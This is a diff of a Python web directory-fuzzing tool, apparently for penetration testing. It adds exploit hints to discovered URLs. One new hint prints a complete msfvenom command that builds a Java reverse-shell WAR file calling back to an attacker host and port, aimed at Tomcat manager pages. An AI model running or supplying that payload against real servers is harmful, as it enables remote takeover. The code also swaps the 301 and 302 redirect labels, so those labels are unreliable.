@@ -53,24 +53,44 @@ def prepare_wordlist(url: str, wordlist: TextIO) -> Tuple[list, list, int]:
     return urls, badwords, total_urls
 
 
-def exploit_suggester(url: str) -> str:
+def exploit_suggester(url: str) -> str | None:
     """Takes a URL and determines if vulnerabilities might exist. Returns vulnerability notes."""
     if re.search("/cgi-bin/", url):
         return "└─[¿shellshock?] -> Scan for scripts in /cgi-bin/ (e.g. http://127.0.0.1/cgi-bin/FUZZ.sh)."
-
+    if re.search(":8080/manager", url):
+        return "└─[¿tomcat?] -> 'msfvenom -p java/shell_reverse_tcp lhost=10.10.10.10 lport=4444 -f war -o revshell.war'"
     return
 
-def process_url(url: str) -> str:
-    """Performs a GET request for the URL and returns a page status string."""
+
+# def process_files(url: str, extensions: list) -> str:
+#     """Performs a GET request for the URI and returns a file status code."""
+#     for extension in extensions:
+#         res = requests.get(f"{url.strip()} + .{extension}", timeout=3, allow_redirects=False, headers=headers)
+
+
+
+def process_url(url: str) -> str | None:
+    """Performs a GET request for the URL and returns a page status code."""
     try:
         res = requests.get(url.strip(), timeout=3, allow_redirects=False, headers=headers)
         match res.status_code:
             case 200:
-                return f"Discovered: {url}"
+                if re.search("Error 404", res.text):
+                    return None
+                if exploit_suggester(url) != None:
+                    return f"Discovered: {url}\n{exploit_suggester(url)}"
+                else:
+                    return f"Discovered: {url}"
             case 301:
-                return f"Temporary redirect: {url}"
+                if exploit_suggester(url) != None:
+                    return f"Temporary redirect: {url}\n{exploit_suggester(url)}"
+                else:
+                    return f"Temporary redirect: {url}"
             case 302:
-                return f"Permanent redirect: {url}"
+                if exploit_suggester(url) != None:
+                    return f"Permanent redirect: {url}\n{exploit_suggester(url)}"
+                else:
+                    return f"Permanent redirect: {url}"
             case 403:
                 if exploit_suggester(url) != None:
                     return f"Forbidden: {url}\n{exploit_suggester(url)}"
